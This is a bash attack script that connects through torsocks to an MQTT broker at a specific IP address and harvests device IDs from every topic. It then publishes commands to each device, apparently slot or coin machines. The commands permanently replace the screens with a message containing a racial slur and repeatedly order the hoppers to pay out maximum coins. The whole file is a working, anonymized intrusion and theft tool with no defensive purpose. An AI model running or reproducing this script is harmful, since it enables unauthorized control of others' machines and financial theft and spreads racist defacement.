#!/bin/bash
# LIVE SLOT KILLER - No files, pure stream DEFACE+MAX DROP
BROKER="188.14.144.138" 
PORT="1883"
MSG='{"display":"TRUSTEDF57 CIAO NEGRO","neon":1,"permanent":true}'

echo "[+] LIVE SLOT DESTROYER STARTED - Ctrl+C stop"

# PIPE live: sub -> grep MAC -> attack IMMEDIATE
torsocks mosquitto_sub -h $BROKER -p $PORT -t '#' -v 2>/dev/null | \
while IFS= read -r line; do
  # Extract LIVE MACs on-the-fly
  MAC=$(echo "$line" | grep -oE 'm/o/([0-9A-F]{20})' | cut -d'/' -f3)
  
  if [ -n "$MAC" ]; then
    echo "[+] LIVE HIT: $MAC - FULL ATTACK"
    
    # DEFACE PERMANENTE TUTTI SCHERMI
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/k/$MAC" -m "$MSG" &
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/display/$MAC" -m "$MSG" &
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/o/$MAC" -m "{\"text\":\"TRUSTEDF57 CIAO NEGRO\"}" &
    
    # SVUOTA + MAX DROP MONETE (hopper max payout)
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/o/$MAC" -m '{"cnt":0,"drop":"MAX","pay":"MAX"}' &
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/k/$MAC" -m '{"drop":true,"amount":"MAX"}' &
    
    # DROP LOOP MAX senza flood
    for i in {1..10}; do
      torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/o/$MAC" -m "{\"drop\":true,\"coins\":\"MAX\",\"cycle\":$i}" &
      sleep 0.3
    done
  fi
done
